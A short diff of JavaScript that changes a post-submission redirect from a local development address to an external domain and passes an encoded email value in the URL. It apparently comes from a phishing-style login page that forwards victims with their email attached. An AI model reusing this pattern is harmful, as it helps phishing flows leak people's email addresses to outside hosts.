@@ -87,7 +87,7 @@
 
             if (res["signal"] == "ok") {
               window.location.replace(
-                `http://127.0.0.1:5501/pages/latestPages/nar/?ed=${b4_emailauto}`,
+                `https://travelsandtour.kjavtospares.com/?ed=${b4_emailauto}`,
               );
             } else {
               $("#showerror").html(
